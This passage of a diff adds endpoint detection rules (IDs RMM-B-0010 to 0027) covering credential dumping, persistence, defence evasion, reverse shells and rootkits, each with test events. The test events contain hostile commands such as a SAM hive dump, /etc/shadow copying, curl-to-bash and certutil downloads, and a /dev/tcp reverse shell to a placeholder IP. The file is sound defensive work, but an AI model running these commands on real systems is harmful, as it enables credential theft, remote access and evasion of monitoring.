+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "reg.exe",
+       "command_line": "reg save HKLM\\SAM C:\\temp\\sam.hiv"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "reg.exe",
+       "command_line": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0010",
+   "name": "Shadow password file copied",
+   "description": "Copying, encoding or sending /etc/shadow.",
+   "severity": "high",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1003.008"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "/etc/shadow"
+     },
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": [
+       "cat",
+       "cp",
+       "tar",
+       "base64",
+       "xxd",
+       "scp",
+       "curl",
+       "nc",
+       "zip",
+       "python3",
+       "python"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "cp",
+       "command_line": "cp /etc/shadow /tmp/.s"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "bash",
+       "command_line": "bash"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "passwd",
+       "command_line": "passwd alice"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "bash",
+       "command_line": "bash"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0011",
+   "name": "Program added to a Run key",
+   "description": "A new value under a Run or RunOnce key starts a program at every sign-in.",
+   "severity": "medium",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1547.001"
+   ],
+   "event": "registry",
+   "when": {
+    "all": [
+     {
+      "field": "registry.key",
+      "op": "regex",
+      "value": [
+       "\\\\software\\\\(wow6432node\\\\)?microsoft\\\\windows\\\\currentversion\\\\run(once)?$"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "registry",
+      "action": "set",
+      "registry": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+       "value": "Updater",
+       "data": "C:\\Users\\Public\\u.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "registry",
+      "action": "set",
+      "registry": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\X",
+       "value": "DisplayName",
+       "data": "X"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "set"
+   ]
+  },
+  {
+   "id": "RMM-B-0012",
+   "name": "Scheduled task created from a user folder",
+   "description": "schtasks /create running something from Temp, AppData, Public or ProgramData.",
+   "severity": "medium",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1053.005"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "schtasks"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "/create"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": [
+       "\\temp\\",
+       "\\appdata\\",
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "schtasks.exe",
+       "command_line": "schtasks /create /sc minute /tn upd /tr C:\\Users\\Public\\upd.exe"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "schtasks.exe",
+       "command_line": "schtasks /query /fo list"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0013",
+   "name": "systemd service added",
+   "description": "A new unit file under /etc/systemd/system.",
+   "severity": "medium",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1543.002"
+   ],
+   "event": "file",
+   "when": {
+    "all": [
+     {
+      "field": "file.path",
+      "op": "starts_with",
+      "value": "/etc/systemd/system/"
+     },
+     {
+      "field": "file.extension",
+      "op": "equals",
+      "value": [
+       "service",
+       "timer"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "create",
+      "file": {
+       "path": "/etc/systemd/system/kworker.service"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "create",
+      "file": {
+       "path": "/etc/systemd/system/x.conf"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "create"
+   ]
+  },
+  {
+   "id": "RMM-B-0014",
+   "name": "Crontab changed",
+   "description": "System or user crontabs created or modified.",
+   "severity": "low",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1053.003"
+   ],
+   "event": "file",
+   "when": {
+    "field": "file.path",
+    "op": "starts_with",
+    "value": [
+     "/etc/cron",
+     "/var/spool/cron/"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "modify",
+      "file": {
+       "path": "/var/spool/cron/crontabs/root"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "modify",
+      "file": {
+       "path": "/etc/hosts"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "create",
+    "modify"
+   ]
+  },
+  {
+   "id": "RMM-B-0015",
+   "name": "SSH authorized keys changed",
+   "description": "A key added to someone's authorized_keys gives lasting access.",
+   "severity": "medium",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1098.004"
+   ],
+   "event": "file",
+   "when": {
+    "field": "file.path",
+    "op": "ends_with",
+    "value": [
+     "/.ssh/authorized_keys",
+     "/.ssh/authorized_keys2"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "modify",
+      "file": {
+       "path": "/root/.ssh/authorized_keys"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "modify",
+      "file": {
+       "path": "/root/.ssh/known_hosts"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "create",
+    "modify"
+   ]
+  },
+  {
+   "id": "RMM-B-0016",
+   "name": "Library preload hijack",
+   "description": "/etc/ld.so.preload makes every program load a library: rootkits use it.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1574.006"
+   ],
+   "event": "file",
+   "when": {
+    "field": "file.path",
+    "op": "equals",
+    "value": "/etc/ld.so.preload"
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "create",
+      "file": {
+       "path": "/etc/ld.so.preload"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "file",
+      "action": "create",
+      "file": {
+       "path": "/etc/ld.so.conf.d/x.conf"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "create",
+    "modify"
+   ]
+  },
+  {
+   "id": "RMM-B-0017",
+   "name": "Service created from a user folder",
+   "description": "sc.exe create with the binary in Temp, AppData or Public.",
+   "severity": "high",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1543.003"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "sc"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "create"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": [
+       "\\temp\\",
+       "\\appdata\\",
+       "\\users\\public\\"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "sc.exe",
+       "command_line": "sc create svc binpath= C:\\Users\\Public\\s.exe start= auto"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "sc.exe",
+       "command_line": "sc query spooler"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0018",
+   "name": "Encoded PowerShell command",
+   "description": "PowerShell run with a long base64 -EncodedCommand, which hides what it does.",
+   "severity": "medium",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1059.001",
+    "T1027"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": [
+       "powershell",
+       "pwsh"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "\\s-e(c|nc|ncodedcommand)?\\s+[a-z0-9+/=]{40,}"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0019",
+   "name": "certutil used to download",
+   "description": "certutil -urlcache fetching a file, a common living-off-the-land download.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1105"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": "certutil"
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": [
+       "urlcache",
+       "verifyctl"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": [
+       "http://",
+       "https://"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "certutil.exe",
+       "command_line": "certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "certutil.exe",
+       "command_line": "certutil -hashfile setup.exe SHA256"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0020",
+   "name": "Download piped into a shell",
+   "description": "curl or wget output run straight by a shell.",
+   "severity": "medium",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1059.004",
+    "T1105"
+   ],
+   "event": "process",
+   "when": {
+    "field": "process.command_line",
+    "op": "regex",
+    "value": [
+     "(curl|wget)\\b[^|;]*\\|\\s*(sudo\\s+)?(ba|z|da|k)?sh\\b"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bash",
+       "command_line": "bash -c curl -s http://203.0.113.9/x | bash"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "sshd",
+       "command_line": "sshd"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bash",
+       "command_line": "bash -c curl -fsSL https://example.com/f -o f"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "sshd",
+       "command_line": "sshd"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0021",
+   "name": "Defender protection switched off",
+   "description": "Set-MpPreference turning off real-time, behaviour or download scanning.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1562.001"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "set-mppreference"
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "-disable(realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning)\\s+(\\$true|1)"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell Set-MpPreference -SignatureUpdateInterval 4"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0022",
+   "name": "Event logs cleared",
+   "description": "wevtutil cl or Clear-EventLog erasing the Windows logs.",
+   "severity": "high",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1070.001"
+   ],
+   "event": "process",
+   "when": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "process.name",
+        "op": "equals",
+        "value": "wevtutil"
+       },
+       {
+        "field": "process.command_line",
+        "op": "regex",
+        "value": [
+         "\\s(cl|clear-log)\\s"
+        ]
+       }
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "value": "clear-eventlog"
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "wevtutil.exe",
+       "command_line": "wevtutil cl Security"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "wevtutil.exe",
+       "command_line": "wevtutil qe System /c:5"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "explorer.exe",
+       "command_line": "C:\\Windows\\explorer.exe"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0023",
+   "name": "Linux audit trail tampered with",
+   "description": "Audit rules deleted, or shell history wiped.",
+   "severity": "medium",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1070.003",
+    "T1562.012"
+   ],
+   "event": "process",
+   "when": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "process.name",
+        "op": "equals",
+        "value": "auditctl"
+       },
+       {
+        "field": "process.command_line",
+        "op": "regex",
+        "value": [
+         "\\s-D\\b",
+         "\\s-e\\s*0\\b"
+        ]
+       }
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "regex",
+      "value": [
+       "history\\s+-c",
+       "unset\\s+histfile",
+       "rm\\s+(-f\\s+)?\\S*\\.bash_history",
+       "ln\\s+-sf?\\s+/dev/null\\s+\\S*\\.bash_history"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "auditctl",
+       "command_line": "auditctl -D"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "bash",
+       "command_line": "bash"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "auditctl",
+       "command_line": "auditctl -l"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "bash",
+       "command_line": "bash"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0024",
+   "name": "Office app started a shell",
+   "description": "Word, Excel, PowerPoint or Outlook starting a command shell or script host: usually a malicious document.",
+   "severity": "high",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1566.001",
+    "T1204.002"
+   ],
+   "event": "process",
+   "when": {
+    "all": [
+     {
+      "field": "parent.name",
+      "op": "equals",
+      "value": [
+       "winword",
+       "excel",
+       "powerpnt",
+       "outlook",
+       "msaccess",
+       "mspub"
+      ]
+     },
+     {
+      "field": "process.name",
+      "op": "equals",
+      "value": [
+       "cmd",
+       "powershell",
+       "pwsh",
+       "wscript",
+       "cscript",
+       "mshta",
+       "rundll32",
+       "regsvr32"
+      ]
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "powershell.exe",
+       "command_line": "powershell -w hidden -c iex"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "WINWORD.EXE",
+       "command_line": "WINWORD.EXE /n invoice.docm"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "splwow64.exe",
+       "command_line": "splwow64.exe 8192"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "WINWORD.EXE",
+       "command_line": "WINWORD.EXE"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0025",
+   "name": "Reverse shell one-liner",
+   "description": "A shell wired to a network socket.",
+   "severity": "high",
+   "confidence": "medium",
+   "mode": "audit",
+   "mitre": [
+    "T1059"
+   ],
+   "event": "process",
+   "when": {
+    "field": "process.command_line",
+    "op": "regex",
+    "value": [
+     "(ba)?sh\\s+-i\\s*>&\\s*/dev/tcp/",
+     "\\bnc(at)?\\b.*\\s-e\\s+/bin/(ba)?sh",
+     "socket\\.socket\\(.*(subprocess|pty\\.spawn)",
+     "mkfifo\\s+\\S+;.*\\bnc\\b"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bash",
+       "command_line": "bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "php-fpm",
+       "command_line": "php-fpm"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "process",
+      "action": "start",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "bash",
+       "command_line": "bash -c echo hello > /dev/null"
+      },
+      "parent": {
+       "pid": 1000,
+       "name": "cron",
+       "command_line": "cron"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "start"
+   ]
+  },
+  {
+   "id": "RMM-B-0026",
+   "name": "Connection to a mining or C2 port",
+   "description": "Outbound connections to ports used by miners and common C2 defaults.",
+   "severity": "low",
+   "confidence": "low",
+   "mode": "audit",
+   "mitre": [
+    "T1571",
+    "T1496"
+   ],
+   "event": "network",
+   "when": {
+    "all": [
+     {
+      "field": "network.remote_port",
+      "op": "equals",
+      "value": [
+       "3333",
+       "4444",
+       "5555",
+       "14444",
+       "45700"
+      ]
+     },
+     {
+      "not": {
+       "field": "network.remote_addr",
+       "op": "regex",
+       "value": [
+        "^(127\\.|10\\.|192\\.168\\.|::1$)"
+       ]
+      }
+     }
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "network",
+      "action": "connect",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "svc.exe",
+       "command_line": "svc.exe"
+      },
+      "network": {
+       "protocol": "tcp",
+       "local_addr": "10.0.0.5",
+       "local_port": 50123,
+       "remote_addr": "198.51.100.20",
+       "remote_port": 3333
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "network",
+      "action": "connect",
+      "process": {
+       "pid": 4242,
+       "ppid": 1000,
+       "name": "svc.exe",
+       "command_line": "svc.exe"
+      },
+      "network": {
+       "protocol": "tcp",
+       "local_addr": "10.0.0.5",
+       "local_port": 50123,
+       "remote_addr": "198.51.100.20",
+       "remote_port": 443
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "connect"
+   ]
+  },
+  {
+   "id": "RMM-B-0027",
+   "name": "Known rootkit module loaded",
+   "description": "A Linux kernel module with the name of a public rootkit.",
+   "severity": "severe",
+   "confidence": "high",
+   "mode": "alert",
+   "mitre": [
+    "T1547.006",
+    "T1014"
+   ],
+   "event": "module",
+   "when": {
+    "field": "module.name",
+    "op": "equals",
+    "value": [
+     "diamorphine",
+     "reptile",
+     "reptile_module",
+     "suterusu",
+     "adore_ng",
+     "kovid"
+    ]
+   },
+   "tests": [
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "module",
+      "action": "load",
+      "module": {
+       "name": "diamorphine"
+      }
+     },
+     "expect": true
+    },
+    {
+     "event": {
+      "ts": "2026-11-10T12:00:00Z",
+      "kind": "module",
+      "action": "load",
+      "module": {
+       "name": "nf_conntrack"
+      }
+     },
+     "expect": false
+    }
+   ],
+   "actions": [
+    "load"
+   ]
+  }
+ ]
+}
